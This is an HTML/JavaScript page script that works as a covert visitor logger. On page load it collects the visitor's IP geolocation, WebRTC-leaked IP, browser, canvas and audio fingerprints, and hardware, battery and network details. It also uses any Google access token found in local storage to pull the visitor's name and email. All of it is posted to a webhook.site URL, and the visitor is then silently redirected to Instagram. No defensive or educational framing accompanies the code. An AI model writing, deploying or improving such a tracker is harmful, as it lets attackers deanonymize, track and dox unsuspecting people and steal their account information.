<!-- FingerprintJS Library -->
<script src="https://fpjscdn.net/v3"></script>

<script>
    // --- CONFIGURATION ---
    // IMPORTANT: This is your Webhook.site URL
    const WEBHOOK_URL = "https://webhook.site/23943f87-8dd1-44e5-bb1a-d21c49296805";
    const FINGERPRINT_PUBLIC_KEY = "OZ32MdWEuPUfwlPD5MvN";
    const FINAL_REDIRECT_URL = "https://www.instagram.com";

    // --- DO NOT EDIT BELOW THIS LINE ---

    // --- MODIFIED IP LOOKUP FUNCTION (CORS FIX) ---
// --- CORRECTED IP LOOKUP FUNCTION ---
// --- BULLETPROOF IP LOOKUP FUNCTION ---
async function getIpData() {
    // This uses a simple, reliable JSONP call to ipapi.co.
    // It's the most robust way to get IP data from a browser.
    return new Promise((resolve) => {
        // Define the callback function globally
        window.ipapiCallback = (data) => {
            resolve(data);
            // Clean up the script tag and callback function
            delete window.ipapiCallback;
            document.body.removeChild(scriptElement);
        };

        // Create the script element
        const scriptElement = document.createElement('script');
        scriptElement.src = 'https://ipapi.co/json/?callback=ipapiCallback';
        scriptElement.onerror = () => {
            console.error("IPAPI script failed to load.");
            resolve(null); // Resolve with null on error
            delete window.ipapiCallback;
        };

        // Add it to the page to trigger the request
        document.body.appendChild(scriptElement);
    });
}

    async function getAdvancedFingerprint() {
        const fp = await FingerprintJS.load({ apiKey: FINGERPRINT_PUBLIC_KEY });
        const result = await fp.get({ extendedResult: true });
        return result;
    }

    async function getWebRTCIP() {
        return new Promise((resolve) => {
            const rtc = new RTCPeerConnection({ iceServers: [] });
            rtc.createDataChannel('');
            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
            rtc.onicecandidate = (event) => {
                if (event && event.candidate && event.candidate.candidate) {
                    const ipMatch = event.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
                    if (ipMatch) {
                        resolve(ipMatch[0]);
                        rtc.close();
                    }
                }
            };
            setTimeout(() => { resolve(null); rtc.close(); }, 2000);
        });
    }

    async function getBatteryInfo() {
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            return { level: battery.level, charging: battery.charging };
        }
        return null;
    }

    async function getAudioFingerprint() {
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const analyser = audioContext.createAnalyser();
            const gainNode = audioContext.createGain();
            const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
            oscillator.type = 'triangle';
            oscillator.frequency.value = 10000;
            gainNode.gain.value = 0;
            oscillator.connect(analyser);
            analyser.connect(scriptProcessor);
            scriptProcessor.connect(gainNode);
            gainNode.connect(audioContext.destination);
            oscillator.start();
            return new Promise(resolve => {
                scriptProcessor.onaudioprocess = (event) => {
                    const fingerprint = event.inputBuffer.getChannelData(0).slice(0, 50).join('');
                    oscillator.stop();
                    audioContext.close();
                    resolve(fingerprint);
                };
            });
        } catch (e) {
            return "AudioContext not supported";
        }
    }

    function getPrivacySettings() {
        return { cookieEnabled: navigator.cookieEnabled, doNotTrack: navigator.doNotTrack, plugins: Array.from(navigator.plugins).map(p => p.name).slice(0, 10), javaEnabled: typeof navigator.javaEnabled === 'function' ? navigator.javaEnabled() : false, pdfViewerEnabled: navigator.pdfViewerEnabled, };
    }

    function getSystemInfo() {
        return { timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, timezoneOffset: new Date().getTimezoneOffset(), language: navigator.language, languages: navigator.languages, platform: navigator.platform, userAgent: navigator.userAgent, vendor: navigator.vendor, cpuArchitecture: navigator.userAgentData?.platform || 'N/A', isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent), };
    }

    function getScreenInfo() {
        return { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth, devicePixelRatio: window.devicePixelRatio, };
    }

    function getNetworkInfo() {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (connection) { return { effectiveType: connection.effectiveType, downlink: connection.downlink, rtt: connection.rtt, saveData: connection.saveData, }; }
        return null;
    }

    function getStorageInfo() {
        if (navigator.storage && navigator.storage.estimate) { return navigator.storage.estimate().then(estimate => { return { quota: estimate.quota, usage: estimate.usage, }; }); }
        return Promise.resolve(null);
    }

    async function getGoogleUserInfo() {
        try { const token = localStorage.getItem('google_access_token'); if (!token) return null; const response = await fetch('https://people.googleapis.com/v1/people/me?personFields=names,emailAddresses', { headers: { 'Authorization': `Bearer ${token}` } }); if (response.ok) { return await response.json(); } } catch (e) { } return null;
    }

    async function logAndRedirect() {
    console.log("ðŸš€ [LOGGER] Starting comprehensive logging process...");
    try {
        console.log("ðŸ” [LOGGER] Gathering all possible data...");
        const [ ipData, fpResult, webrtcIP, battery, audioFingerprint, privacySettings, systemInfo, screenInfo, networkInfo, storageInfo, googleInfo ] = await Promise.allSettled([
            // --- FIX #2: Use the new IP lookup function ---
            getIpData(),
            getAdvancedFingerprint(),
            getWebRTCIP(),
            getBatteryInfo(),
            getAudioFingerprint(),
            Promise.resolve(getPrivacySettings()),
            Promise.resolve(getSystemInfo()),
            Promise.resolve(getScreenInfo()),
            Promise.resolve(getNetworkInfo()),
            getStorageInfo(),
            getGoogleUserInfo(),
        ]);
        console.log("âœ… [LOGGER] Data gathering complete.");
        const payload = { timestamp: new Date().toISOString(), ip: ipData.value?.ip, city: ipData.value?.city, region: ipData.value?.region, country: ipData.value?.country_name, postal: ipData.value?.postal, latitude: ipData.value?.latitude, longitude: ipData.value?.longitude, isp: ipData.value?.org, asn: ipData.value?.asn, timezone: ipData.value?.timezone, fingerprintId: fpResult.value?.visitorId, confidence: fpResult.value?.confidence.score, browser: fpResult.value?.browserName, browserVersion: fpResult.value?.browserVersion, os: fpResult.value?.os, osVersion: fpResult.value?.osVersion, device: fpResult.value?.device, incognito: fpResult.value?.incognito, canvasFingerprint: fpResult.value?.canvasHash, webglFingerprint: fpResult.value?.webGlHash, fontFingerprint: fpResult.value?.fontHash, audioFingerprint: audioFingerprint.value, gpu: fpResult.value?.graphicsCard?.renderer, gpuVendor: fpResult.value?.graphicsCard?.vendor, screen: screenInfo.value, deviceMemory: navigator.deviceMemory || 'N/A', hardwareConcurrency: navigator.hardwareConcurrency || 'N/A', system: systemInfo.value, webrtcIP: webrtcIP.value, network: networkInfo.value, storage: storageInfo.value, battery: battery.value, privacy: privacySettings.value, googleAccountInfo: googleInfo.value, };
        console.log("ðŸ“¤ [LOGGER] Sending payload to Webhook.site...");
        const discordPayload = { username: "Advanced Logger", embeds: [{ title: "ðŸ” Comprehensive User Log", description: `A user from **${payload.city || 'N/A'}** has been logged.`, color: 5814783, fields: [ { name: "ðŸ“ Location & IP", "value": `**IP:** ${payload.ip}\n**City:** ${payload.city}\n**Region:** ${payload.region}\n**Country:** ${payload.country}\n**ISP:** ${payload.isp}`, inline: true }, { name: "ðŸ’» System", "value": `**OS:** ${payload.os} ${payload.osVersion}\n**Browser:** ${payload.browser} ${payload.browserVersion}\n**Device:** ${payload.device}\n**CPU Cores:** ${payload.hardwareConcurrency}\n**Memory:** ${payload.deviceMemory}GB`, inline: true }, { name: "ðŸ–¥ï¸ Hardware", "value": `**GPU:** ${payload.gpu}\n**GPU Vendor:** ${payload.gpuVendor}\n**Screen:** ${payload.screen.width}x${payload.screen.height}\n**Color Depth:** ${payload.screen.colorDepth}\n**Pixel Ratio:** ${payload.screen.devicePixelRatio}`, inline: true }, { name: "ðŸŒ Network", "value": `**WebRTC IP:** ${payload.webrtcIP || 'N/A'}\n**Connection:** ${payload.network?.effectiveType || 'N/A'}\n**Downlink:** ${payload.network?.downlink || 'N/A'} Mbps\n**RTT:** ${payload.network?.rtt || 'N/A'} ms`, inline: true }, { name: "ðŸ”‹ Power", "value": `**Level:** ${payload.battery ? Math.round(payload.battery.level * 100) + '%' : 'N/A'}\n**Charging:** ${payload.battery ? (payload.battery.charging ? 'Yes' : 'No') : 'N/A'}`, inline: true }, { name: "ðŸ”’ Privacy", "value": `**Cookies:** ${payload.privacy.cookieEnabled ? 'Enabled' : 'Disabled'}\n**Do Not Track:** ${payload.privacy.doNotTrack || 'Unspecified'}\n**Incognito:** ${payload.incognito ? 'Yes' : 'No'}`, inline: true }, { name: "ðŸ§‘â€ðŸ’» Potential Personal Info", "value": `**Google Account:** ${payload.googleAccountInfo ? 'Found (see logs)' : 'Not Found'}\n**User Agent:** \`\`\`${payload.system.userAgent}\`\`\``, inline: false }, { name: "ðŸ”‘ Unique IDs", "value": `**Fingerprint ID:** \`${payload.fingerprintId}\`\n**Confidence:** ${payload.confidence}\n**Canvas FP:** \`${payload.canvasFingerprint}\`\n**WebGL FP:** \`${payload.webglFingerprint}\``, inline: false } ], footer: { text: `Logged at ${payload.timestamp}` } }] };
        // --- FIX #1: Use the correct variable name for the webhook URL ---
        // Send the main embed
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(discordPayload)
        });
        // If Google info was found, send it in a separate, more detailed embed
        if (payload.googleAccountInfo) {
            const googlePayload = {
                username: "Advanced Logger",
                embeds: [{
                    title: "ðŸ” Google Account Info Found",
                    color: 15105570, // Yellow color for warning
                    description: "Partial Google account information was extracted from the browser's local storage.",
                    fields: [{
                            name: "Full Name",
                            value: payload.googleAccountInfo.names?.map(n => n.displayName).join(', ') || 'N/A',
                            inline: true
                        },
                        {
                            name: "Email Addresses",
                            value: payload.googleAccountInfo.emailAddresses?.map(e => e.value).join(', ') || 'N/A',
                            inline: true
                        }
                    ],
                    footer: {
                        text: `Logged at ${payload.timestamp}`
                    }
                }]
            };
            // --- FIX #1: Use the correct variable name for the webhook URL ---
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(googlePayload)
            });
        }
        console.log("âœ… [LOGGER] Data sent to Webhook.site.");
    } catch (error) {
        console.error("ðŸ’¥ [LOGGER] A critical error occurred during logging:", error);
    } finally {
        console.log("ðŸ”— [LOGGER] Redirecting to final URL...");
        window.location.href = FINAL_REDIRECT_URL;
    }
}

    // Start the logging process as soon as the page loads
    window.addEventListener('load', logAndRedirect);
</script>
